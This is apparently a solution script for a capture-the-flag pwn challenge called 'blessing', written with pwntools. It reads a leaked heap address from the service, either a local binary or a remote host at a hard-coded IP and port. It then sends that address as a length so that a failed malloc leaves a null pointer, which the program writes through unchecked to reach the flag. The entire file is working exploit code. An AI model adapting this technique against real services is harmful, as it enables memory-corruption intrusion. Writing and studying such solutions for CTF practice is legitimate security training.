#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./blessing_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, "break *main+361")
    else:
        r = remote("94.237.61.252", 41103)

    return r


def main():
    r = conn()

    r.recvuntil(b"this: ")
    target_chunk = int(r.recvuntil(b"\b \b", drop = True).ljust(8, b"\x00"), 16)
    log.info(f"target chunk: 0x{target_chunk:x}")

    # Malloc will fail and return 0.
    # Program doesn't check if return is 0 and performs `buf + size` so `0x0 + target`
    r.sendlineafter(b"length: ", str(f"{target_chunk}").encode("ascii"))
    r.sendlineafter(b"song: ", b"A" * 8)

    flag = r.recvline().decode("ascii")
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
